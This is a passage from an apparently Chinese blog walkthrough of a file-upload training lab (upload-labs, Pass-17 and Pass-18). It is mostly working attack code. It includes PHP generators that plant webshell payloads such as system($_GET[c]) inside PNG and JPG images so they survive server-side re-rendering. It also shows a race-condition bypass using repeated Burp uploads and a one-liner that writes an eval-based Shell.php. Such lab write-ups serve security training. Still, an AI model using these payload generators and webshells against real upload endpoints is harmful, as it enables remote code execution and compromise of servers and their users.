使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$im</span> == <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是jpg格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>); <span class="comment">// 删除原始上传文件</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 为新图片指定一个文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()) . <span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">                <span class="comment">// 显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagejpeg</span>(<span class="variable">$im</span>, <span class="variable">$img_path</span>);</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>); <span class="comment">// 删除原始上传文件</span></span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="制作GIF🐎过程"><a href="#制作GIF🐎过程" class="headerlink" title="制作GIF🐎过程"></a>制作GIF🐎过程</h2><p>把上传后的文件下载到本地，利用<code>010Editor</code>软件的对比功能，找到没有被更改的地方插入我们的🐎</p>
<p><img lazyload alt="image" data-src="https://github.com/C2yb8er/picx-images-hosting/raw/master/20230716/c2yb8erimage-20230713160820442.25hp5nbckev4.png"></p>
<p><img lazyload alt="image" data-src="https://github.com/C2yb8er/picx-images-hosting/raw/master/20230716/c2yb8erimage-20230713160934472.7fz82sfeg3c0.png"></p>
<p><img lazyload alt="image" data-src="https://github.com/C2yb8er/picx-images-hosting/raw/master/20230716/c2yb8erimage-20230713161150637.75vw4ag482s0.png"></p>
<p><code>PNG、JPG同等类似</code></p>
<h2 id="制作PNG🐎过程"><a href="#制作PNG🐎过程" class="headerlink" title="制作PNG🐎过程"></a>制作PNG🐎过程</h2><p>这里再讲一下PNG图片🐎的制作过程，相比于GIF，PNG和JPG的制作难度简直上了一个档次。</p>
<p>直接使用大佬的程序生成一个图片🐎，其内容是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;./1.png&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这样会生成一个1.png文件其中内容包括了<code>&lt;?$_GET[0]($_POST[1]);?&gt;</code>，然后直接上传，成功后利用文件上传漏洞getshell。</p>
<p><img lazyload alt="image" data-src="https://github.com/C2yb8er/picx-images-hosting/raw/master/20230716/c2yb8erimage-20230713201956758.5f8rrcyflec0.png"></p>
<h2 id="制作JPG🐎过程"><a href="#制作JPG🐎过程" class="headerlink" title="制作JPG🐎过程"></a>制作JPG🐎过程</h2><p>直接用大佬的php程序生成：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$miniPayload</span> = <span class="string">&#x27;&lt;?=system($_GET[c]);?&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;gd&#x27;</span>) || !<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">    	<span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="title function_ invoke__">set_error_handler</span>(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">		<span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">		<span class="variable">$dis</span> = <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">		<span class="variable">$outStream</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">		<span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">		<span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>()) &amp;&amp; (<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">			<span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>();</span><br><span class="line">			<span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() - <span class="number">2</span>;</span><br><span class="line">			<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">skip</span>(<span class="variable">$size</span>);</span><br><span class="line">			<span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">				<span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>();</span><br><span class="line">				<span class="variable">$outStreamTmp</span> = </span><br><span class="line">					<span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">					<span class="variable">$miniPayload</span> . </span><br><span class="line">					<span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) . </span><br><span class="line">					<span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">				<span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">				<span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">					<span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>())) &#123;</span><br><span class="line">						<span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">							<span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">								<span class="keyword">break</span>;</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>() - <span class="number">2</span>;</span><br><span class="line">					<span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">					<span class="variable">$outStream</span> = </span><br><span class="line">						<span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">						<span class="variable">$miniPayload</span> . </span><br><span class="line">						<span class="title function_ invoke__">substr</span>(</span><br><span class="line">							<span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">								<span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">							<span class="number">0</span>,</span><br><span class="line">							<span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) . </span><br><span class="line">								<span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">				&#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">					<span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span>(<span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">					<span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">		<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">		<span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">		<span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$filename</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">			<span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">		<span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">				<span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">		<span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">		<span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">		<span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">			<span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">				<span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) || !<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))</span><br><span class="line">					<span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">				<span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="variable language_">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">			<span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;size - <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData));</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">eof</span>()) &#123;</span><br><span class="line">				<span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="variable">$byte</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">			<span class="keyword">return</span> <span class="title function_ invoke__">ord</span>(<span class="variable">$byte</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">				<span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="variable">$short</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">			<span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;order) &#123;</span><br><span class="line">				<span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">			<span class="keyword">return</span> !<span class="variable language_">$this</span>-&gt;binData||(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img lazyload alt="image" data-src="https://jsd.cdn.zzko.cn/gh/C2yb8er/picx-images-hosting@master/20230717/c2yb8er-image-20230717090034384.28tq5g1nrdwk.png"></p>
<p><img lazyload alt="image" data-src="https://jsd.cdn.zzko.cn/gh/C2yb8er/picx-images-hosting@master/20230717/c2yb8er-image-20230717090057776.5ksr1y6ul3c0.png"></p>
<h1 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h1><blockquote>
<p>条件竞争上传绕过</p>
</blockquote>
<p>限制：文件后缀白名单，如果是<code>jpg、png、gif</code>中的一种，就将文件进行重命名。如果不符合的话，<code>unlink()</code>函数就会删除该文件。</p>
<p>条件竞争上传绕过：<code>unlink()</code>函数就会删除文件的过程是需要耗费时间的。如果我们能在上传的🐎被删除之前访问就能getshell了。</p>
<p>利用burp多线程发包，然后不断在浏览器访问我们的<code>webshell</code>，会有一瞬间的访问成功。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$file_name</span>,<span class="title function_ invoke__">strrpos</span>(<span class="variable">$file_name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$upload_file</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             <span class="title function_ invoke__">rename</span>(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;Shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php echo &quot;pwned!&quot;;@eval($_GET[&quot;cmd&quot;])?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>通过执行这段代码后，将生成一个名为 <code>Shell.php</code>的文件其内容是:</p>
<p><code>&lt;?php echo &quot;pwned!&quot;;@eval($_GET[&quot;cmd&quot;])?&gt;</code></p>
